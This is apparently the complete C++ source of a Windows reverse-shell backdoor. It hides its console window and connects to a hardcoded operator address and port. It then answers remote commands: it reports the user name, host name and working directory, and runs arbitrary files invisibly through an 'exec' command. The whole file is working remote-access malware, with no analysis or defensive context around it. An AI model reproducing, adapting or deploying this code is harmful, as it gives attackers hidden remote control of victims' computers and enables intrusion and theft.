//Main headers

#include <winsock2.h>       //Socket connection
#include <windows.h>        //Used for WinApi calls
#include <ws2tcpip.h>       //TCP-IP Sockets
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

// Debug headers
// #include <iostream>

void exec(char* returnval, int returnsize, char *fileexec)
{
    // std::cout << fileexec << std::endl;
    if (32 >= (int)(ShellExecute(NULL,"open", fileexec, NULL, NULL, SW_HIDE))) //Get return value in int
    {
        strcat(returnval, "[x] Error executing command..\n");
    }
    else
    {
        strcat(returnval, "\n");
    }
}

void whoami(char* returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetUserName(returnval, &bufferlen);
}

void hostname(char* returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetComputerName(returnval, &bufferlen);
}

void pwd(char* returnval, int returnsize) //Module 2
{
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
}

void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(8080);

    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        // std::cout << "[+] Connected to client. waiting for incoming command..." << std::endl;
        char CommandReceived[DEFAULT_BUFLEN] = "";
        while (true)
        {
            int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
            // std::cout << "Command received: " << CommandReceived;
            // std::cout << "Length of Command received: " << Result << std::endl;
            if ((strcmp(CommandReceived, "whoami") == 0)) {
                char buffer[257] = "";
                whoami(buffer,257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "hostname") == 0)) {
                char buffer[257] = "";
                hostname(buffer,257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "pwd") == 0)) {
                char buffer[257] = "";
                pwd(buffer,257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "exit") == 0)) {
                closesocket(tcpsock);
                WSACleanup();
                exit(0);
            }
            else {
                char splitval[DEFAULT_BUFLEN] = "";
                for(int i=0; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                {
                    if (CommandReceived[i] == *" ")    //CommandReceived[i] is a pointer here and can only be compared with a integer, this *" "
                    {
                        break;
                    }
                    else
                    {
                        splitval[i] = CommandReceived[i];
                    }
                }
                if ((strcmp(splitval, "exec") == 0)) {
                    char CommandExec[DEFAULT_BUFLEN] = "";
                    int j = 0;
                    for(int i=5; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                    {
                        CommandExec[j] = CommandReceived[i];
                        ++j;
                    }
                    char buffer[257] = "";
                    exec(buffer, 257, CommandExec);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else {
                    char buffer[20] = "Invalid Command\n";
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
            }
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

int main()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
    RevShell();
    return 0;
}
